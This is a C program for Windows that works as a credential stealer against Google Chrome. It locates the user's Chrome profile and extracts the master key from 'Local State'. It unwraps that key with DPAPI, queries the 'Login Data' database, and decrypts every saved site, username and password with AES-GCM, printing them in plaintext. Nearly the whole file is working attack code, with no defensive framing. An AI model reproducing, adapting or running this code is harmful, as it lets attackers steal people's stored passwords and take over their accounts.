#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <wincrypt.h>
#include <stdint.h>
#include "sqlite3.h"
#include <sodium.h>

#pragma comment(lib, "Crypt32.lib")

#define MAX_PATH_LENGTH 256
#define MAX_LINE_LENGTH 1024
#define IV_SIZE 12


void displayErrorMessage(DWORD errorCode) {
    LPSTR messageBuffer = NULL;
    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&messageBuffer,
        0,
        NULL);

    if (messageBuffer != NULL) {
        printf("Error: %s\n", messageBuffer);
        LocalFree(messageBuffer);
    }
    else {
        printf("Error: Unable to get error message for code %d\n", errorCode);
    }
}

char* getEncryptionKey(const char* encryption_key_path) {
    FILE* encryption_key_file = fopen(encryption_key_path, "r");
    if (encryption_key_file == NULL) {
        printf("Error opening encryption_key_file: ");
        displayErrorMessage(GetLastError());
        return NULL;
    }

    char buffer[MAX_LINE_LENGTH];
    char* key = NULL; // Define key pointer
    long offset = 0;

    while (fgets(buffer, MAX_LINE_LENGTH, encryption_key_file) != NULL) {
        // Find the position of "encrypted_key"
        char* key_start = strstr(buffer, "\"encrypted_key\":\"");
        if (key_start != NULL) {
            // Calculate the offset from the beginning of the file
            offset += key_start - buffer; // Offset within the current buffer
            // Seek to the position of "encrypted_key" within the file
            fseek(encryption_key_file, offset, SEEK_SET);
            // Allocate memory for the key
            key = (char*)malloc(MAX_LINE_LENGTH); // Max key length
            if (key == NULL) {
                printf("Error: Memory allocation failed.\n");
                fclose(encryption_key_file);
                return NULL;
            }
            // Read the key value directly from the file
            if (fgets(key, MAX_LINE_LENGTH, encryption_key_file) == NULL) {
                printf("Error reading key value.\n");
                fclose(encryption_key_file);
                free(key); // Free memory in case of error
                return NULL;
            }

            break; // Exit the loop once key is found
        }
        // Update offset for the next iteration
        offset += strlen(buffer);
    }

    // If the key is not found
    fclose(encryption_key_file);
    return key;
}

BYTE* base64decode(const char* base64_encoded_key, DWORD* decoded_length) {
    DWORD input_length = strlen(base64_encoded_key);
    DWORD output_length;

    // Pass NULL as the first parameter to obtain the required output length
    CryptStringToBinaryA(base64_encoded_key, input_length, CRYPT_STRING_BASE64, NULL, &output_length, NULL, NULL);

    // Allocate memory for decoded data
    BYTE* decoded_data = (BYTE*)malloc(output_length);
    if (decoded_data == NULL) {
        printf("Error allocating memory for decoded_data.\n");
        return NULL;
    }

    // Decode Base64 encoded string
    if (!CryptStringToBinaryA(base64_encoded_key, input_length, CRYPT_STRING_BASE64, decoded_data, &output_length, NULL, NULL)) {
        printf("Base64 decoding failed.\n");
        free(decoded_data); // Free memory before returning NULL
        return NULL;
    }

    // Update decoded length
    *decoded_length = output_length;

    return decoded_data;
}

DATA_BLOB decryptData(const char* encryptedData, DWORD encryptedDataLength) {

    DATA_BLOB encryptedBlob;
    DATA_BLOB decryptedBlob = { 0 };

    encryptedBlob.cbData = encryptedDataLength;
    encryptedBlob.pbData = (BYTE*)encryptedData;

    BYTE* decoded_data = (BYTE*)malloc(encryptedDataLength);
    if (decoded_data == NULL) {
        printf("Error allocating memory for decoded_data.\n");
        return decryptedBlob;
    }

    encryptedBlob.cbData -= 5;
    encryptedBlob.pbData += 5;

    if (CryptUnprotectData(&encryptedBlob, NULL, NULL, NULL, NULL, 0, &decryptedBlob)) {
        // Decryption successful
        return decryptedBlob;
    }
    else {
        // Decryption failed
        printf("Error decrypting data: ");
        displayErrorMessage(GetLastError());
        return decryptedBlob;
    }
}

void decrypt_payload(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted) {
    unsigned long long decrypted_len; 
    int result = crypto_aead_aes256gcm_decrypt(decrypted, &decrypted_len, NULL, ciphertext, ciphertext_len, NULL, 0, iv, key);
    if (result != 0) {
        printf("Decryption failed\n");
        displayErrorMessage(GetLastError()); //Error: The system cannot find the file specified.
    }
}

void printHex(const BYTE* data, DWORD length) {
    for (DWORD i = 0; i < length; i++) {
        printf("\\x%02X", data[i]);
    }
    printf("\n");
}

int main() {
    char* username = getenv("USERNAME");
    if (username == NULL) {
        printf("Error: Unable to get username.\n");
        return 1;
    }

    printf("[+] Got username: %s\n", username);

    char password_path[MAX_PATH_LENGTH];
    snprintf(password_path, MAX_PATH_LENGTH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", username);

    printf("[+] Password path ready: %s\n", password_path);

    char encryption_key_path[MAX_PATH_LENGTH];
    snprintf(encryption_key_path, MAX_PATH_LENGTH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", username);

    printf("[+] Encryption key path ready: %s\n", encryption_key_path);

    char base64_key[1024];
    char* encryption_key = getEncryptionKey(encryption_key_path);

    char* base64_start = strstr(encryption_key, "\"encrypted_key\":\"");
    if (base64_start != NULL) {
        base64_start += strlen("\"encrypted_key\":\"");

        char* base64_end = strchr(base64_start, '"');
        if (base64_end != NULL) {

            strncpy(base64_key, base64_start, base64_end - base64_start);
            base64_key[base64_end - base64_start] = '\0';
            //strcpy(base64_key, base64_key + 8);
            printf("[+] Extracted base64 key value: %s\n", base64_key);
        }
        else {
            printf("Value not found.\n");
            return 1;
        }
    }
    else {
        printf("Key not found.\n");
        return 1;
    }

    DWORD decoded_length;
    BYTE* decoded_data = base64decode(base64_key, &decoded_length);  

    printHex(decoded_data, decoded_length);

    DATA_BLOB masterkey;

    masterkey = decryptData(decoded_data, decoded_length);

    printf("[+] Maskterkey not hex %s: \n", masterkey.pbData);
    printf("[+] Maskterkey in hex: \n");
    printHex(masterkey.pbData, masterkey.cbData);



    //**********Decrypting passwords**********


    //Open SQL database
    sqlite3* db;
    int rc = sqlite3_open(password_path, &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    printf("[+] Opened SQL databes succesfully\n");

    const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
    sqlite3_stmt* stmt;
    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to execute SQL query: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    printf("[+] Executed SQL query succesfully\n");


    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const unsigned char* originUrl = sqlite3_column_text(stmt, 0);
        const unsigned char* usernameValue = sqlite3_column_text(stmt, 1);
        const void* passwordBlob = sqlite3_column_blob(stmt, 2);
        int passwordSize = sqlite3_column_bytes(stmt, 2);
        
        printf("Origin URL: %s\n", originUrl);
        printf("Username: %s\n", usernameValue);
        printf("Full password from local data (Binary): ");
        for (int i = 0; i < passwordSize; ++i)
            printf("\\%02x", ((unsigned char*)passwordBlob)[i]);
        printf("\n");
        printf("****Full password size: %d\n", passwordSize);


        unsigned char iv[12];
        if (passwordSize >= 15) { 
            memcpy(iv, (unsigned char*)passwordBlob + 3, 12);
        }
        else {
            fprintf(stderr, "Password size too small to generate IV\n");
            continue; 
        }

        printf("IV: ");
        for (int i = 0; i < 12; ++i)
            printf("\\%02x", iv[i]);
        printf("\n");


       
        if (passwordSize <= 15) {
            fprintf(stderr, "Password size too small\n");
            continue; 
        }

        
        BYTE* Password = (BYTE*)malloc(passwordSize - 14);
        memcpy(Password, (unsigned char*)passwordBlob + 15, passwordSize - 15);
        Password[passwordSize - 15] = '\0';


        
        printf("Password: ");
        for (int i = 0; i < passwordSize - 15; ++i)
            printf("\\%02x", Password[i]);
        printf("\n");


        decrypt_payload(Password, passwordSize - 15, masterkey.pbData, iv, Password);
        printf("Decrypted password is: %s\n", Password);

        
        printf("\n");
     
    }


    sqlite3_finalize(stmt);
    sqlite3_close(db);


    free(decoded_data);
    return 0;
}